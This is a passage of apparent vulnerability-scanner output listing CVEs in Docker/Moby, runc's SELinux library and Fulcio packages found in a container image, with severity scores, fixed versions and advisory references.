│     │      ├ Title           : Moby: Moby: Authorization bypass vulnerability 
│     │      ├ Description     : Moby is an open source container framework. Prior to version 29.3.1, a
│     │      │                   security vulnerability has been detected that allows attackers to bypass
│     │      │                   authorization plugins (AuthZ). This issue has been patched in version
│     │      │                   29.3.1. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-288 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ ghsa  : 3 
│     │      │                  ├ nvd   : 3 
│     │      │                  ├ photon: 3 
│     │      │                  ╰ redhat: 2 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H 
│     │      │                  │        ╰ V3Score : 8.8 
│     │      │                  ├ nvd    ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H 
│     │      │                  │        ╰ V3Score : 7.8 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N 
│     │      │                           ╰ V3Score : 8.4 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-34040 
│     │      │                  ├ [1]: https://docs.docker.com/engine/extend/plugins_authorization 
│     │      │                  ├ [2]: https://github.com/moby/moby 
│     │      │                  ├ [3]: https://github.com/moby/moby/commit/e89edb19ad7de0407a5d31e3111cb01aa10b
│     │      │                  │      5a38 
│     │      │                  ├ [4]: https://github.com/moby/moby/releases/tag/docker-v29.3.1 
│     │      │                  ├ [5]: https://github.com/moby/moby/security/advisories/GHSA-v23v-6jw2-98fq 
│     │      │                  ├ [6]: https://github.com/moby/moby/security/advisories/GHSA-x744-4wpc-v9h2 
│     │      │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-34040 
│     │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-34040 
│     │      ├ PublishedDate   : 2026-03-31T03:15:57.883Z 
│     │      ╰ LastModifiedDate: 2026-06-17T10:38:28.383Z 
│     ├ [1]  ╭ VulnerabilityID : CVE-2026-41567 
│     │      ├ VendorIDs        ─ [0]: GHSA-x86f-5xw2-fm2r 
│     │      ├ PkgID           : github.com/docker/docker@v28.5.1+incompatible 
│     │      ├ PkgName         : github.com/docker/docker 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/docker/docker@v28.5.1%2Bincompatible 
│     │      │                  ╰ UID : 65d09eff9cd64aa5 
│     │      ├ InstalledVersion: v28.5.1+incompatible 
│     │      ├ Status          : affected 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-41567 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:081ba22da45acb7e5f23bb2e8bf88cfd1a5bd261c4ce44c51c22ff340075dc27 
│     │      ├ Title           : docker: Moby/Docker Engine: Arbitrary Code Execution via malicious container
│     │      │                   image and compressed archive upload 
│     │      ├ Description     : Moby is an open source container framework. In versions prior to 29.5.1 and in
│     │      │                    moby/moby v2 prior to v2.0.0-beta.14, when a compressed archive is uploaded
│     │      │                   to a container via `PUT /containers/{id}/archive` or piped through `docker cp
│     │      │                   -`, the daemon resolves decompression binaries (such as `xz` or `unpigz`) from
│     │      │                    the container's filesystem rather than the host's due to incorrect ordering
│     │      │                   of operations. A malicious container image containing a trojanized
│     │      │                   decompression binary can achieve arbitrary code execution with full daemon
│     │      │                   privileges, including host root UID and unrestricted capabilities, when a user
│     │      │                    uploads a compressed (xz or gzip) archive into that container. This issue is
│     │      │                   fixed in Docker Engine 29.5.1 and moby/moby v2.0.0-beta.14. Workarounds
│     │      │                   include only running containers from trusted images, using authorization
│     │      │                   plugins to restrict access to the `PUT /containers/{id}/archive` endpoint, and
│     │      │                    avoiding piping compressed archives into containers created from untrusted
│     │      │                   images 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-427 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ ghsa  : 3 
│     │      │                  ├ photon: 3 
│     │      │                  ╰ redhat: 3 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:N 
│     │      │                  │        ╰ V3Score : 7.2 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:H 
│     │      │                           ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:37387 
│     │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:41030 
│     │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:42852 
│     │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:44622 
│     │      │                  ├ [4] : https://access.redhat.com/security/cve/CVE-2026-41567 
│     │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2485356 
│     │      │                  ├ [6] : https://github.com/moby/moby 
│     │      │                  ├ [7] : https://github.com/moby/moby/security/advisories/GHSA-x86f-5xw2-fm2r 
│     │      │                  ├ [8] : https://nvd.nist.gov/vuln/detail/CVE-2026-41567 
│     │      │                  ├ [9] : https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-41567
│     │      │                  │       .json 
│     │      │                  ╰ [10]: https://www.cve.org/CVERecord?id=CVE-2026-41567 
│     │      ├ PublishedDate   : 2026-06-05T02:17:13.817Z 
│     │      ╰ LastModifiedDate: 2026-07-27T13:17:57.79Z 
│     ├ [2]  ╭ VulnerabilityID : CVE-2026-42306 
│     │      ├ VendorIDs        ─ [0]: GHSA-rg2x-37c3-w2rh 
│     │      ├ PkgID           : github.com/docker/docker@v28.5.1+incompatible 
│     │      ├ PkgName         : github.com/docker/docker 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/docker/docker@v28.5.1%2Bincompatible 
│     │      │                  ╰ UID : 65d09eff9cd64aa5 
│     │      ├ InstalledVersion: v28.5.1+incompatible 
│     │      ├ Status          : affected 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42306 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:8f6d3dea7bd0e7ae1e1eaf49b26ed08bf57484c625f8cde64b107d34d80ea1d6 
│     │      ├ Title           : Moby is an open source container framework. In Docker Engine prior to  ... 
│     │      ├ Description     : Moby is an open source container framework. In Docker Engine prior to version
│     │      │                   29.5.1, Docker Daemon versions 28.5.2 and prior, and Moby Daemon prior to
│     │      │                   version 2.0.0-beta.14, a race condition during docker cp mount setup allows a
│     │      │                   malicious container to redirect a bind mount target to an arbitrary host path,
│     │      │                    potentially overwriting host files or causing denial of service. This issue
│     │      │                   has been patched in Docker Engine version 29.5.1 and Moby Daemon version
│     │      │                   2.0.0-beta.14. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ╭ [0]: CWE-61 
│     │      │                  ╰ [1]: CWE-367 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ ghsa  : 3 
│     │      │                  ├ nvd   : 3 
│     │      │                  ╰ photon: 3 
│     │      ├ CVSS             ╭ ghsa ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:C/C:N/I:H/A:H 
│     │      │                  │      ╰ V3Score : 7.2 
│     │      │                  ╰ nvd  ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:C/C:N/I:H/A:H 
│     │      │                         ╰ V3Score : 7.2 
│     │      ├ References       ╭ [0]: https://github.com/moby/moby 
│     │      │                  ├ [1]: https://github.com/moby/moby/security/advisories/GHSA-rg2x-37c3-w2rh 
│     │      │                  ╰ [2]: https://nvd.nist.gov/vuln/detail/CVE-2026-42306 
│     │      ├ PublishedDate   : 2026-06-12T19:16:27.49Z 
│     │      ╰ LastModifiedDate: 2026-06-17T10:47:39.96Z 
│     ├ [3]  ╭ VulnerabilityID : CVE-2026-33997 
│     │      ├ VendorIDs        ─ [0]: GHSA-pxq6-2prw-chj9 
│     │      ├ PkgID           : github.com/docker/docker@v28.5.1+incompatible 
│     │      ├ PkgName         : github.com/docker/docker 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/docker/docker@v28.5.1%2Bincompatible 
│     │      │                  ╰ UID : 65d09eff9cd64aa5 
│     │      ├ InstalledVersion: v28.5.1+incompatible 
│     │      ├ FixedVersion    : 29.3.1 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33997 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:2daed0d90b8d51e5d84bf7d32d18eb8333b7d558b478c474743476643db75fb1 
│     │      ├ Title           : moby: docker: github.com/moby/moby: Moby: Privilege validation bypass during
│     │      │                   plugin installation 
│     │      ├ Description     : Moby is an open source container framework. Prior to version 29.3.1, a
│     │      │                   security vulnerability has been detected that allows plugins privilege
│     │      │                   validation to be bypassed during docker plugin install. Due to an error in the
│     │      │                    daemon's privilege comparison logic, the daemon may incorrectly accept a
│     │      │                   privilege set that differs from the one approved by the user. Plugins that
│     │      │                   request exactly one privilege are also affected, because no comparison is
│     │      │                   performed at all. This issue has been patched in version 29.3.1. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ╭ [0]: CWE-193 
│     │      │                  ╰ [1]: CWE-266 
│     │      ├ VendorSeverity   ╭ amazon: 2 
│     │      │                  ├ ghsa  : 2 
│     │      │                  ├ nvd   : 3 
│     │      │                  ├ photon: 3 
│     │      │                  ╰ redhat: 3 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N 
│     │      │                  │        ╰ V3Score : 6.8 
│     │      │                  ├ nvd    ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N 
│     │      │                  │        ╰ V3Score : 8.1 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:H 
│     │      │                           ╰ V3Score : 8.4 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:21769 
│     │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:22347 
│     │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:23345 
│     │      │                  ├ [3] : https://access.redhat.com/security/cve/CVE-2026-33997 
│     │      │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2453277 
│     │      │                  ├ [5] : https://docs.docker.com/engine/extend/legacy_plugins 
│     │      │                  ├ [6] : https://github.com/moby/moby 
│     │      │                  ├ [7] : https://github.com/moby/moby/commit/f4d6f25bf0c3fa12d4968320a4568594775
│     │      │                  │       6a22a 
│     │      │                  ├ [8] : https://github.com/moby/moby/releases/tag/docker-v29.3.1 
│     │      │                  ├ [9] : https://github.com/moby/moby/security/advisories/GHSA-pxq6-2prw-chj9 
│     │      │                  ├ [10]: https://nvd.nist.gov/vuln/detail/CVE-2026-33997 
│     │      │                  ├ [11]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-33997
│     │      │                  │       .json 
│     │      │                  ╰ [12]: https://www.cve.org/CVERecord?id=CVE-2026-33997 
│     │      ├ PublishedDate   : 2026-03-31T03:15:57.523Z 
│     │      ╰ LastModifiedDate: 2026-07-27T13:17:41.643Z 
│     ├ [4]  ╭ VulnerabilityID : CVE-2026-41568 
│     │      ├ VendorIDs        ─ [0]: GHSA-vp62-88p7-qqf5 
│     │      ├ PkgID           : github.com/docker/docker@v28.5.1+incompatible 
│     │      ├ PkgName         : github.com/docker/docker 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/docker/docker@v28.5.1%2Bincompatible 
│     │      │                  ╰ UID : 65d09eff9cd64aa5 
│     │      ├ InstalledVersion: v28.5.1+incompatible 
│     │      ├ Status          : affected 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-41568 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:8b3eea271c20e0ce30a06af708fa925f1d433933adf82cdc0f8abad778463f56 
│     │      ├ Title           : github.com/docker/docker: github.com/moby/moby: Moby: Denial of Service via
│     │      │                   race condition in docker cp mount setup 
│     │      ├ Description     : Moby is an open source container framework. In Docker Engine prior to version
│     │      │                   29.5.1, Docker Daemon versions 28.5.2 and prior, and Moby Daemon prior to
│     │      │                   version 2.0.0-beta.14, a race condition during docker cp mount setup allows a
│     │      │                   malicious container to create empty files or directories at arbitrary absolute
│     │      │                    paths on the host filesystem. This issue has been patched in Docker Engine
│     │      │                   version 29.5.1 and Moby Daemon version 2.0.0-beta.14. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ╭ [0]: CWE-81 
│     │      │                  ╰ [1]: CWE-367 
│     │      ├ VendorSeverity   ╭ ghsa  : 2 
│     │      │                  ╰ redhat: 1 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:C/C:N/I:L/A:H 
│     │      │                  │        ╰ V3Score : 6 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:C/C:N/I:L/A:L 
│     │      │                           ╰ V3Score : 3.9 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-41568 
│     │      │                  ├ [1]: https://github.com/moby/moby 
│     │      │                  ├ [2]: https://github.com/moby/moby/security/advisories/GHSA-vp62-88p7-qqf5 
│     │      │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-41568 
│     │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-41568 
│     │      ├ PublishedDate   : 2026-06-12T19:16:26.907Z 
│     │      ╰ LastModifiedDate: 2026-06-17T10:46:51.787Z 
│     ├ [5]  ╭ VulnerabilityID : CVE-2025-52881 
│     │      ├ VendorIDs        ─ [0]: GHSA-cgrx-mc8f-2prm 
│     │      ├ PkgID           : github.com/opencontainers/selinux@v1.12.0 
│     │      ├ PkgName         : github.com/opencontainers/selinux 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/opencontainers/selinux@v1.12.0 
│     │      │                  ╰ UID : 8482b50106737177 
│     │      ├ InstalledVersion: v1.12.0 
│     │      ├ FixedVersion    : 1.13.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-52881 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:cff90c0946445025c08523c198bd366b907d6d77b7b456578d78d1f6d8bc682d 
│     │      ├ Title           : runc: opencontainers/selinux: container escape and denial of service due to
│     │      │                   arbitrary write gadgets and procfs write redirects 
│     │      ├ Description     : runc is a CLI tool for spawning and running containers according to the OCI
│     │      │                   specification. In versions 1.2.7, 1.3.2 and 1.4.0-rc.2, an attacker can trick
│     │      │                   runc into misdirecting writes to /proc to other procfs files through the use
│     │      │                   of a racing container with shared mounts (we have also verified this attack is
│     │      │                    possible to exploit using a standard Dockerfile with docker buildx build as
│     │      │                   that also permits triggering parallel execution of containers with custom
│     │      │                   shared mounts configured). This redirect could be through symbolic links in a
│     │      │                   tmpfs or theoretically other methods such as regular bind-mounts. While
│     │      │                   similar, the mitigation applied for the related CVE, CVE-2019-19921, was
│     │      │                   fairly limited and effectively only caused runc to verify that when LSM labels
│     │      │                    are written they are actually procfs files. This issue is fixed in versions
│     │      │                   1.2.8, 1.3.3, and 1.4.0-rc.3. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ╭ [0]: CWE-61 
│     │      │                  ╰ [1]: CWE-363 
│     │      ├ VendorSeverity   ╭ alma        : 3 
│     │      │                  ├ amazon      : 3 
│     │      │                  ├ azure       : 2 
│     │      │                  ├ bottlerocket: 3 
│     │      │                  ├ cbl-mariner : 3 
│     │      │                  ├ ghsa        : 3 
│     │      │                  ├ nvd         : 3 
│     │      │                  ├ oracle-oval : 3 
│     │      │                  ├ photon      : 3 
│     │      │                  ├ redhat      : 3 
│     │      │                  ├ rocky       : 3 
│     │      │                  ╰ ubuntu      : 3 
│     │      ├ CVSS             ╭ ghsa   ╭ V40Vector: CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:A/VC:H/VI:H/VA:H/SC:H/SI:
│     │      │                  │        │            H/SA:H 
│     │      │                  │        ╰ V40Score : 7.3 
│     │      │                  ├ nvd    ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:H 
│     │      │                  │        ╰ V3Score : 7.5 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H 
│     │      │                           ╰ V3Score : 8.2 
│     │      ├ References       ╭ [0] : http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-52881 
│     │      │                  ├ [1] : http://github.com/opencontainers/runc/commit/a41366e74080fa9f26a2cd3544
│     │      │                  │       e2801449697322 
│     │      │                  ├ [2] : http://github.com/opencontainers/runc/commit/fdcc9d3cad2f85954a241ccb91
│     │      │                  │       0a61aaa1ef47f3 
│     │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2025:22011 
│     │      │                  ├ [4] : https://access.redhat.com/security/cve/CVE-2025-52881 
│     │      │                  ├ [5] : https://bugzilla.redhat.com/2404715 
│     │      │                  ├ [6] : https://bugzilla.redhat.com/2407258 
│     │      │                  ├ [7] : https://bugzilla.redhat.com/show_bug.cgi?id=2404715 
│     │      │                  ├ [8] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-52881 
│     │      │                  ├ [9] : https://errata.almalinux.org/9/ALSA-2025-22011.html 
│     │      │                  ├ [10]: https://errata.rockylinux.org/RLSA-2025:23543 
│     │      │                  ├ [11]: https://github.com/bottlerocket-os/bottlerocket-core-kit/blob/develop/a
│     │      │                  │       dvisories/10.9.0/BRSA-fokfzmhxepqx.toml 
│     │      │                  ├ [12]: https://github.com/opencontainers/runc 
│     │      │                  ├ [13]: https://github.com/opencontainers/runc/blob/v1.4.0-rc.2/RELEASES.md 
│     │      │                  ├ [14]: https://github.com/opencontainers/runc/commit/3f925525b44d247e390e529e7
│     │      │                  │       72a0dc0c0bc3557 
│     │      │                  ├ [15]: https://github.com/opencontainers/runc/commit/435cc81be6b79cdec73b4002c
│     │      │                  │       0dae549b2f6ae6d 
│     │      │                  ├ [16]: https://github.com/opencontainers/runc/commit/44a0fcf685db051c80b8c2698
│     │      │                  │       12bb177f5802c58 
│     │      │                  ├ [17]: https://github.com/opencontainers/runc/commit/4b37cd93f86e72feac8664429
│     │      │                  │       88b549b5b7bf3e6 
│     │      │                  ├ [18]: https://github.com/opencontainers/runc/commit/6fc191449109ea14bb7d61238
│     │      │                  │       f24a33fe08c651f 
│     │      │                  ├ [19]: https://github.com/opencontainers/runc/commit/77889b56db939c323d29d1130
│     │      │                  │       f28f9aea2edb544 
│     │      │                  ├ [20]: https://github.com/opencontainers/runc/commit/77d217c7c3775d8ca5af89e47
│     │      │                  │       7e81568ef4572db 
│     │      │                  ├ [21]: https://github.com/opencontainers/runc/commit/a41366e74080fa9f26a2cd354
│     │      │                  │       4e2801449697322 
│     │      │                  ├ [22]: https://github.com/opencontainers/runc/commit/b3dd1bc562ed9996d1a0f249e
│     │      │                  │       056c16624046d28 
│     │      │                  ├ [23]: https://github.com/opencontainers/runc/commit/d40b3439a9614a86e87b81a94
│     │      │                  │       c6811ec6fa2d7d2 
│     │      │                  ├ [24]: https://github.com/opencontainers/runc/commit/d61fd29d854b416feaaf128bf
│     │      │                  │       650325cd2182165 
│     │      │                  ├ [25]: https://github.com/opencontainers/runc/commit/db19bbed5348847da433faa9d
│     │      │                  │       69e9f90192bfa64 
│     │      │                  ├ [26]: https://github.com/opencontainers/runc/commit/ed6b1693b8b3ae7eb0250a7e7
│     │      │                  │       6fc888cdacf98c1 
│     │      │                  ├ [27]: https://github.com/opencontainers/runc/commit/fdcc9d3cad2f85954a241ccb9
│     │      │                  │       10a61aaa1ef47f3 
│     │      │                  ├ [28]: https://github.com/opencontainers/runc/commit/ff6fe1324663538167eca8b3d
│     │      │                  │       3eec61e1bd4fa51 
│     │      │                  ├ [29]: https://github.com/opencontainers/runc/commit/ff94f9991bd32076c871ef0ad
│     │      │                  │       8bc1b763458e480 
│     │      │                  ├ [30]: https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h2
│     │      │                  │       9p-rfm2 
│     │      │                  ├ [31]: https://github.com/opencontainers/runc/security/advisories/GHSA-cgrx-mc
│     │      │                  │       8f-2prm 
│     │      │                  ├ [32]: https://github.com/opencontainers/runc/security/advisories/GHSA-fh74-hm
│     │      │                  │       69-rqjw 
│     │      │                  ├ [33]: https://github.com/opencontainers/runc/security/advisories/GHSA-qw9x-cq
│     │      │                  │       r3-wc7r 
│     │      │                  ├ [34]: https://github.com/opencontainers/selinux/pull/237 
│     │      │                  ├ [35]: https://github.com/opencontainers/selinux/releases/tag/v1.13.0 
│     │      │                  ├ [36]: https://linux.oracle.com/cve/CVE-2025-52881.html 
│     │      │                  ├ [37]: https://linux.oracle.com/errata/ELSA-2025-23543.html 
│     │      │                  ├ [38]: https://nvd.nist.gov/vuln/detail/CVE-2025-52881 
│     │      │                  ├ [39]: https://pkg.go.dev/github.com/cyphar/filepath-securejoin/pathrs-lite/pr
│     │      │                  │       ocfs 
│     │      │                  ├ [40]: https://ubuntu.com/security/notices/USN-7851-1 
│     │      │                  ├ [41]: https://www.cve.org/CVERecord?id=CVE-2025-52881 
│     │      │                  ├ [42]: https://youtu.be/tGseJW_uBB8 
│     │      │                  ╰ [43]: https://youtu.be/y1PaBzxwRWQ 
│     │      ├ PublishedDate   : 2025-11-06T21:15:42.817Z 
│     │      ╰ LastModifiedDate: 2026-06-17T09:37:12.35Z 
│     ├ [6]  ╭ VulnerabilityID : CVE-2025-66506 
│     │      ├ VendorIDs        ─ [0]: GHSA-f83f-xpx7-ffpw 
│     │      ├ PkgID           : github.com/sigstore/fulcio@v1.7.1 
│     │      ├ PkgName         : github.com/sigstore/fulcio 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/sigstore/fulcio@v1.7.1 
│     │      │                  ╰ UID : b4b2df00ae799d52 
│     │      ├ InstalledVersion: v1.7.1 
│     │      ├ FixedVersion    : 1.8.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-66506 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:4a20d8374812c8283dd6e5bd1c93abdc2a2c5d792ffee52a816dbebf8cbcaf10 
│     │      ├ Title           : github.com/sigstore/fulcio: Fulcio: Denial of Service via crafted OpenID
│     │      │                   Connect (OIDC) token 
│     │      ├ Description     : Fulcio is a free-to-use certificate authority for issuing code signing
│     │      │                   certificates for an OpenID Connect (OIDC) identity. Prior to 1.8.3, function
│     │      │                   identity.extractIssuerURL splits (via a call to strings.Split) its argument
│     │      │                   (which is untrusted data) on periods. As a result, in the face of a malicious
│     │      │                   request with an (invalid) OIDC identity token in the payload containing many
│     │      │                   period characters, a call to extractIssuerURL incurs allocations to the tune
│     │      │                   of O(n) bytes (where n stands for the length of the function's argument), with
│     │      │                    a constant factor of about 16. This vulnerability is fixed in 1.8.3. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-405 
│     │      ├ VendorSeverity   ╭ amazon: 2 
│     │      │                  ├ ghsa  : 3 
│     │      │                  ╰ redhat: 3 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │        ╰ V3Score : 7.5 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                           ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2025-66506 
│     │      │                  ├ [1]: https://github.com/sigstore/fulcio 
│     │      │                  ├ [2]: https://github.com/sigstore/fulcio/commit/765a0e57608b9ef390e1eeeea8595b
│     │      │                  │      9054c63a5a 
│     │      │                  ├ [3]: https://github.com/sigstore/fulcio/security/advisories/GHSA-f83f-xpx7-ffpw 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2025-66506 
│     │      │                  ╰ [5]: https://www.cve.org/CVERecord?id=CVE-2025-66506 
│     │      ├ PublishedDate   : 2025-12-04T22:15:49.503Z 
│     │      ╰ LastModifiedDate: 2026-06-17T09:56:57.13Z 
│     ├ [7]  ╭ VulnerabilityID : CVE-2026-49478 
│     │      ├ VendorIDs        ─ [0]: GHSA-f5mr-q85p-6hh6 
│     │      ├ PkgID           : github.com/sigstore/fulcio@v1.7.1 
│     │      ├ PkgName         : github.com/sigstore/fulcio 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/sigstore/fulcio@v1.7.1 
│     │      │                  ╰ UID : b4b2df00ae799d52 
│     │      ├ InstalledVersion: v1.7.1 
│     │      ├ FixedVersion    : 1.8.6 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-49478 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:93e3aa2ee24c453bedcc1e56d82bb4746c3444c68c78d25daff8754b3f8fd947 
│     │      ├ Title           : github.com/sigstore/fulcio: Fulcio: Server-Side Request Forgery and Kubernetes
│     │      │                    ServiceAccount token leakage 
│     │      ├ Description     : A flaw was found in Fulcio's OpenID Connect (OIDC) Discovery client. This
│     │      │                   vulnerability allows a remote attacker to perform Server-Side Request Forgery
│     │      │                   (SSRF) by redirecting discovery requests to internal systems. Additionally, an
│     │      │                    attacker can manipulate the JSON Web Key Set (JWKS) Uniform Resource
│     │      │                   Identifier (URI) to poison the verifier cache with malicious keys, enabling
│     │      │                   the validation of attacker-controlled signatures. Furthermore, the flaw can
│     │      │                   lead to the leakage of Kubernetes ServiceAccount tokens to third-party hosts
│     │      │                   through cross-host redirects or misconfigured MetaIssuers, potentially
│     │      │                   exposing sensitive cluster credentials. 
│     │      ├ Severity        : HIGH 
